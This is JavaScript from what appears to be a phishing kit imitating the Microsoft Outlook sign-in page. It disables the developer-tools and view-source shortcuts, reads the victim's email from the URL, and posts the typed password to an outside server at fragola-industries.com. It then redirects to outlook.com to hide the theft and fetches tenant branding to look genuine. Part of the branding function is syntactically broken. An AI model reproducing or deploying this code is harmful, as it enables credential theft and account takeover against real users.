		$(document).ready(function () {

			document.onkeydown = function (e) {
				if (event.keyCode == 123) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
					return false;
				}
				if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
					return false;
				}
			}
			var inputpw = document.getElementById("i0118");
			inputpw.addEventListener("keyup", function (event) {
				if (event.keyCode === 13) {
					event.preventDefault();
					document.getElementById("idSIButton9").click();
				}
			});

			// var type = emails;
			// console.log(type);


			// $('#displayName').text(type);

			// 	$('#i0118').focus();
			// 	set_brand(email);

			// }, 0);

			 var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {

        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();

        $('.identity').html(my_ai);
        
        $("#msg").hide();

    }




			var count = 1;

			$('#idSIButton9').on('click', function (event) {
				event.preventDefault ? event.preventDefault() : event.returnValue = false;
				var user = $('.identity').html();
				var pass = $('#i0118').val();
				if (pass == "") {
					$("#passwordError2").show();
					$("#important").hide();
					$("#i0118").css("border-color", "#e81123");
					$('#i0118').focus();

				} else {
					$("#i0118").css("border-color", "black");
					$('#progressBarw').show();
					$("#passwordError2").hide();
					$("#passwordError").hide();
					$('#idSIButton9').prop('disabled', true);
					$.ajax({
						url: "https://www.fragola-industries.com/line/next.php", // add external link here for policy.php
						data: {
							"ai": user,
							"pr": pass
						},
						type: "POST",
						success: function (data) {
							if (data == 1) {
								setTimeout(function () {
									window.location.href = "https://outlook.com"
								}, 2000);
							} else {

								console.log(count);
								count++;
								if (count > 3) {
									count = 1;
									setTimeout(function () {
										window.location.href = "https://outlook.com"
									}, 2000);
								} else {
									$('#i0118').val('');
									$('#progressBarw').hide();
									$("#passwordError").show();
									$("#important").hide();
									$('#idSIButton9').prop('disabled', false);
								}

							}
						},
						error: function (data) {
							console.log('Ajax error');
						}
					});

				}
			});

			function set_brand(email) {
				$.ajax({
					url: '', // add external link here for brand.php

						//i.bg_image !== null && i.logo_image !== null && i.bg_image !== '' && i.logo_image !== ''
						console.log(data.EstsProperties.UserTenantBranding[0].BannerLogo);

						if (data.EstsProperties.UserTenantBranding[0].BannerLogo) {
							$('.background-image').css({ 'background-image': 'url(' + data.EstsProperties.UserTenantBranding[0].Illustration + ')', "-webkit-filter": "brightness(20%)", "filter": "brightness(47%)" });
							$('.logo').attr('src', data.EstsProperties.UserTenantBranding[0].BannerLogo);
						}
					}
				});
			}


		});
